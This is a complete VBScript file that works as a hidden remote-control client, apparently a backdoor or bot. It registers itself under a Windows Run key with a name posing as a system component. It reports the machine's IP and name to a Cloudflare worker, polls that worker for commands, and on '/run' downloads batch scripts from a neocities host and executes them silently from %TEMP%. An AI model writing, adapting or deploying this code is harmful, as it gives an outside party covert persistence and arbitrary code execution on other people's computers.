Option Explicit
On Error Resume Next


Dim shell
Set shell = CreateObject("WScript.Shell")

shell.RegWrite _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Win_32_Operating_System", _
    "wscript.exe """ & WScript.ScriptFullName & """", _
    "REG_SZ"



Dim workerUrl, secret, commandBase, ip, pcname, lastCommandId
Dim normalSleep, speedSleep, speedUntil

Dim isSpeedMode
isSpeedMode = False

workerUrl = "https://soft-cell-6c15.jakob-stebe.workers.dev"
secret = "kosmicar-secret-928374"
commandBase = "https://servercontrollerstepakholodov.neocities.org/commands/"

normalSleep = 15000
speedSleep = 3000
speedUntil = 0

ip = Trim(CurlGet("https://api.ipify.org"))
If ip = "" Then ip = "unknown-ip"

pcname = CreateObject("WScript.Network").ComputerName
If pcname = "" Then pcname = "unknown-pc"

lastCommandId = GetLatestCommandId()
PostLog "online"

Do
    CheckCommand
    UpdateSpeedModeLog

    If isSpeedMode Then
        WScript.Sleep speedSleep
    Else
        WScript.Sleep normalSleep
    End If
Loop

Sub CheckCommand()
    Dim raw, commandId, commandText, parts

    raw = CurlGet(workerUrl & "/get-command")
    If raw = "" Then Exit Sub

    commandId = GetJsonValue(raw, "id")
    commandText = GetJsonValue(raw, "command")

    If commandId = "" Or commandText = "" Then Exit Sub
    If commandId = lastCommandId Then Exit Sub

    lastCommandId = commandId

    parts = Split(commandText, " ")

    If LCase(parts(0)) = "/respond" Then
        If UBound(parts) = 1 Then
            If IsTarget(parts(1)) Then
                EnableSpeedMode
                PostLog "online"
            End If
        End If
    End If

    If LCase(parts(0)) = "/speed" Then
        If UBound(parts) = 1 Then
            If IsTarget(parts(1)) Then
                EnableSpeedMode
                PostLog "speed mode enabled for 5 minutes"
            End If
        End If
    End If

    If LCase(parts(0)) = "/run" Then
        If UBound(parts) = 2 Then
            If IsTarget(parts(2)) Then
                EnableSpeedMode
                RunWebCommand parts(1)
            End If
        End If
    End If
End Sub

Sub EnableSpeedMode()
    speedUntil = Timer + 300

    If speedUntil >= 86400 Then
        speedUntil = speedUntil - 86400
    End If

    If Not isSpeedMode Then
        isSpeedMode = True
        PostLog "entered speed mode"
    End If
End Sub

Sub UpdateSpeedModeLog()
    If isSpeedMode Then
        If Timer >= speedUntil Then
            isSpeedMode = False
            PostLog "exited speed mode"
        End If
    End If
End Sub

Function GetLatestCommandId()
    Dim raw
    raw = CurlGet(workerUrl & "/get-command")
    GetLatestCommandId = GetJsonValue(raw, "id")
End Function

Function IsTarget(target)
    target = LCase(Trim(target))

    IsTarget = False
    If target = "all" Then IsTarget = True
    If target = LCase(ip) Then IsTarget = True
    If target = LCase(pcname) Then IsTarget = True
End Function

Sub RunWebCommand(commandName)
    Dim shell, fso, scriptText, batPath, file

    If Not IsSafeName(commandName) Then
        PostLog "error: unsafe command name"
        Exit Sub
    End If

    PostLog "starting " & commandName

    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    scriptText = CurlGet(commandBase & commandName & ".txt")

    If Trim(scriptText) = "" Then
        PostLog "error: could not download " & commandName
        Exit Sub
    End If

    batPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\servercontroller_" & commandName & ".bat"

    Set file = fso.CreateTextFile(batPath, True)
    file.Write scriptText
    file.Close

    shell.Run "cmd.exe /c call """ & batPath & """", 0, False

    PostLog "started " & commandName
End Sub

Function IsSafeName(name)
    Dim i, ch

    IsSafeName = False

    If Len(name) = 0 Then Exit Function

    For i = 1 To Len(name)
        ch = Mid(name, i, 1)

        If Not ((ch >= "a" And ch <= "z") Or (ch >= "A" And ch <= "Z") Or (ch >= "0" And ch <= "9") Or ch = "_" Or ch = "-") Then
            Exit Function
        End If
    Next

    IsSafeName = True
End Function

Sub PostLog(message)
    PostJson workerUrl & "/send-log", "{""secret"":""" & secret & """,""client"":""" & JsonEscape(pcname) & """,""ip"":""" & JsonEscape(ip) & """,""message"":""" & JsonEscape(message) & """}"
End Sub

Function PostJson(url, body)
    Dim shell, fso, tempFile, file, cmd, exitCode
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\sc_post_client.txt"

    Set file = fso.CreateTextFile(tempFile, True)
    file.Write body
    file.Close

    cmd = "cmd.exe /c curl.exe -s -m 15 -X POST " & Chr(34) & url & Chr(34) & " -H " & Chr(34) & "Content-Type: application/json" & Chr(34) & " --data-binary @" & Chr(34) & tempFile & Chr(34) & " >nul"

    exitCode = shell.Run(cmd, 0, True)

    PostJson = (exitCode = 0)
End Function

Function CurlGet(url)
    Dim shell, fso, tempFile, file, cmd, exitCode

    CurlGet = ""

    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\sc_get_client.txt"

    cmd = "cmd.exe /c curl.exe -s -m 15 " & Chr(34) & url & Chr(34) & " > " & Chr(34) & tempFile & Chr(34)
    exitCode = shell.Run(cmd, 0, True)

    If exitCode <> 0 Or Not fso.FileExists(tempFile) Then Exit Function

    Set file = fso.OpenTextFile(tempFile, 1)
    CurlGet = file.ReadAll
    file.Close
End Function

Function GetJsonValue(json, key)
    Dim find, startPos, endPos, value

    GetJsonValue = ""

    find = """" & key & """:"""
    startPos = InStr(json, find)

    If startPos = 0 Then Exit Function

    startPos = startPos + Len(find)
    endPos = InStr(startPos, json, """")

    If endPos = 0 Then Exit Function

    value = Mid(json, startPos, endPos - startPos)
    value = Replace(value, "\n", vbCrLf)
    value = Replace(value, "\""", """")
    value = Replace(value, "\\", "\")

    GetJsonValue = value
End Function

Function JsonEscape(text)
    text = Replace(text, "\", "\\")
    text = Replace(text, """", "\""")
    JsonEscape = text
End Function
